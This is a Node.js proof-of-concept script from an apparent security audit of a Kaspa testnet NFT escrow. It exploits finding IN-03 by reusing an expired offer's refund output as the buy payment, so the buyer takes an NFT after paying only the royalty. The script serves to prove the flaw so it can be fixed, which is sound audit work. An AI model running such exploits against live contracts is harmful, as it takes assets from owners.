// IN-03 attack (Claude, 2026-11-15): expire's refund output doubles as an
// Edition.buy owner payment. Testnet only. Runs under the BUYER's key (key2).
// Usage: node audit-test/v13-fixed/in03-attack-fixed.js <edIdx>
// Env: PC_NET=testnet, PC_PRIV/PC_WALLET = buyer (key2), RELIKS_ESCROW = the
// expired offer's ledger (offerer = the edition's owner = key1).
// Setup: the edition (edIdx) is listed at 2 KAS by key1; an expired offer X
// (offerer key1, ask 200M, expireAge 10, locked 210M) exists on ANOTHER
// edition (RELIKS_ESCROW). Inputs [E, X, F]; outputs [E', refund, royalty, change].
// The refund (210M to key1) sits at output 1, which is also the buy's owner
// payment slot (base+1) with a >= check (ownerNet 190M) — so the buyer pays
// only the 10M royalty + fee and takes the NFT. EXPECTED: ACCEPTED on the
// current escrow (07362054) — proving IN-03 is real.
const fs = require('fs');
const OL = require('../../lib/reliks-lib.js');
const V = require('../../lib/reliks-lib.js');
const { feeLoop, waitForConfirmation, pickUtxo, sighash, hex, pushMin, pushMinInt } = OL;
const { schnorr } = require('@noble/curves/secp256k1');
const secp = { schnorr: { signSync: (m, p) => schnorr.sign(m, p) } };
const B = Buffer;
const Ed = V.parts(JSON.parse(fs.readFileSync('audit-test/v13-fixed/out/edition.json', 'utf8')));
const Esc = V.parts(JSON.parse(fs.readFileSync('audit-test/v13-fixed/out/escrow.json', 'utf8')));
const LD = JSON.parse(fs.readFileSync((process.env.RELIKS_LEDGER || 'audit-test/v13-fixed/ledger.json'), 'utf8'));
const ESC = JSON.parse(fs.readFileSync((process.env.RELIKS_ESCROW || 'audit-test/v13-fixed/escrow-ledger.json'), 'utf8'));
const [,, kArg] = process.argv;
const ed = LD.editions[Number(kArg)];
if (!ed) throw new Error('edition index not in ledger');
const st = ESC.state;
if (st.offerer !== ed.owner) throw new Error('offerer must equal the edition owner (IN-03 preconditions)');
if (BigInt(ESC.locked) < BigInt(ed.price) - BigInt(ed.price) * BigInt(LD.series.royalty_bips) / 10000n) throw new Error('escrow value below the listing ownerNet — attack cannot work');
const TAG_E = (n) => B.from(Ed.c.entries[n].dispatch_tag, 'hex');
const TAG_S = (n) => B.from(Esc.c.entries[n].dispatch_tag, 'hex');
const H = (x) => B.from(x, 'hex');
const price = BigInt(ed.price);
const roy = price * BigInt(LD.series.royalty_bips) / 10000n;
const ownerNet = price - roy;
const SEQ = Number(st.expireAge);
const stateOf = (owner, pr, adv) => ({ ownerIdentifier: owner, identifierType: 0, price: pr, artist: LD.series.artist, royalty_bips: LD.series.royalty_bips, program_hash: LD.series.program_hash, factory_covid: LD.C, serial: ed.serial, lineage: adv ? adv.lineage : ed.lineage, sales: adv ? adv.sales : ed.sales });
const redeemOf = (s) => B.concat([Ed.prefix, V.encState(Ed, s), Ed.suffix]);
const nextLin = B.from(V.blake2b(B.concat([B.from('ReliksLineageV2', 'utf8'), H(ed.lineage), H(V.USER)]), { dkLen: 32 })).toString('hex');
const rpc = (inputs, outputs) => ({ version: 1, inputs, outputs: outputs.map(o => ({ value: Number(o.amount), scriptPublicKey: '0000' + o.scriptPublicKey, ...(o.covenant ? { covenant: o.covenant } : {}) })), lockTime: 0, subnetworkId: '00'.repeat(20), gas: 0, payload: '', mass: 0 });
(async () => {
  const curRedeem = redeemOf(stateOf(ed.owner, Number(price)));
  const nextRedeem = redeemOf(stateOf(V.USER, 0, { lineage: nextLin, sales: ed.sales + 1 }));
  const escRedeem = B.concat([Esc.prefix, V.encState(Esc, st), Esc.suffix]);
  const escSpk = V.p2sh(escRedeem);
  if (escSpk !== ESC.spk) throw new Error('escrow spk drift vs ledger');
  const wIn = await pickUtxo();
  if (wIn.amount < roy + 3000000n) throw new Error('buyer largest UTXO ' + wIn.amount + ' cannot cover royalty + fee');
  const hsInputs = [
    { txId: ed.txId, index: ed.index, sequence: 0, spk: V.p2sh(curRedeem), amount: BigInt(ed.amount) },
    { txId: ESC.txId, index: ESC.index, sequence: SEQ, spk: escSpk, amount: BigInt(ESC.locked) },
    { txId: wIn.txId, index: wIn.index, sequence: 0, spk: wIn.spk, amount: wIn.amount }
  ];
  const inputs = hsInputs.map((h, i) => ({ previousOutpoint: { transactionId: h.txId, index: h.index }, signatureScript: '', sequence: h.sequence, sigOpCount: 0, computeBudget: i === 2 ? 10 : 100 }));
  function build(fee) {
    const outputs = [
      { amount: BigInt(ed.amount), scriptPublicKey: V.p2sh(nextRedeem), covenant: { authorizingInput: 0, covenantId: ed.cov } },
      { amount: BigInt(ESC.locked), scriptPublicKey: '20' + st.offerer + 'ac' },
      { amount: roy, scriptPublicKey: '20' + LD.series.artist + 'ac' },
      { amount: wIn.amount - roy - fee, scriptPublicKey: wIn.spk }
    ];
    inputs[0].signatureScript = hex(B.concat([pushMin(H(V.USER)), pushMinInt(1), pushMinInt(2), pushMin(TAG_E('buy')), pushMin(curRedeem)]));
    inputs[1].signatureScript = hex(B.concat([pushMin(TAG_S('expire')), pushMin(escRedeem)]));
    inputs[2].signatureScript = '41' + hex(secp.schnorr.signSync(sighash(hsInputs, outputs, 2), V.PRIV)) + '01';
    return rpc(inputs, outputs);
  }
  const { txId } = await feeLoop(build);
  await waitForConfirmation(txId);
  ed.lineage = nextLin; ed.sales = ed.sales + 1; ed.owner = V.USER; ed.price = 0; ed.txId = txId; ed.index = 0;
  ed.spk = hex(V.p2sh(nextRedeem));
  fs.writeFileSync((process.env.RELIKS_LEDGER || 'audit-test/v13-fixed/ledger.json'), JSON.stringify(LD, null, 2));
  fs.writeFileSync((process.env.RELIKS_ESCROW || 'audit-test/v13-fixed/escrow-ledger.json'), JSON.stringify({ ...ESC, status: 'expired', consumed: txId }, null, 2));
  console.log('IN-03 ATTACK ACCEPTED:', txId, '| buyer paid only royalty', roy.toString(), '| ownerNet covered by refund', ESC.locked, '| edition ->', V.USER.slice(0, 12));
})().catch(e => { console.error(e); process.exit(1); });
